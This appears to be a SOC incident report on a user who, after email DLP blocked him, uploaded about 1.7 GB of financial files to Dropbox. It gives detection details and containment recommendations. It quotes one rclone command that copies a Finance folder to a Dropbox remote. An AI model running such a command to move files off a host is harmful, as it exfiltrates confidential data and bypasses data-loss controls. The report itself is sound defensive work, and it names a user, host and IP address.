# DETECTION AND ANALYSIS

## Alert Summary:
Exchange Online DLP and Microsoft Defender for Cloud Apps detected suspected data exfiltration from host WIN10-DH-113 by user lars.haugen@datahaven.no. This activity aligns with a data-theft tactic where sensitive data, initially blocked by email DLP, is then routed to an unsanctioned cloud storage service to bypass controls. The user repeatedly attempted to email “Client_Contracts_Archive.zip” and “Q3_Financials.xlsx” to an external Gmail address, triggering DLP inspection and block events, then attempted a password-protected archive that was flagged by transport rules; shortly after, the rclone utility executed and Dropbox was accessed as an unsanctioned app with a successful web OAuth login and multiple large uploads observed (approx. 1.7 GB total) to dropbox.com (TLS SNI=content.dropboxapi.com), with netflow confirming egress to Dropbox ASN (AS19679) from source IP 84.213.57.42 (Get ISP). 
```
rclone copy C:\Users\Lars\Documents\Finance\ dropbox:/Finance_Backup --transfers 4
```
This command copies the local Finance directory to a Dropbox remote with four concurrent transfers. We recommend that you investigate this activity further, as the activity appears to involve unauthorized transfer of sensitive data.

## Consequence:
The activity indicates likely exposure of confidential financial data and PII to an unsanctioned third-party cloud service (Dropbox). If successful, this constitutes potential data loss, regulatory risk, and confidentiality breach; it may reflect intentional insider exfiltration or an account/host compromise, with continued risk of further exfiltration if the user, credentials, or tooling remain active.

# CONTAINMENT

## Executed Remediation Actions:
The following containment and eradication actions has been performed by our SOC:
- No actions applicable by the MDR SOC due to customer contract.

## Recommended Remediation Actions:
Our SOC recommends that you do the following containment actions:
- Immediately isolate host WIN10-DH-113 from the network to stop further data egress.
- Terminate and block rclone.exe on the endpoint; remove any associated tasks, scripts, and rclone configuration files (e.g., rclone.conf) under the user profile.
- Temporarily disable or lock the account lars.haugen@datahaven.no; reset the password and enforce/confirm MFA.
- Block Dropbox (domains and IP ranges/AS19679) at your firewall/proxy/DNS and through your CASB; explicitly block rclone via application control.
- Revoke Dropbox OAuth tokens/sessions associated with the user; sign out active sessions and request takedown/deletion of uploaded data from Dropbox.
- Run a full EDR/AV scan of WIN10-DH-113 and review autoruns, scheduled tasks, and recent downloads; reimage if integrity cannot be assured.
- Preserve and export relevant logs (email, endpoint, proxy/CASB, netflow) to support investigation and impact assessment.
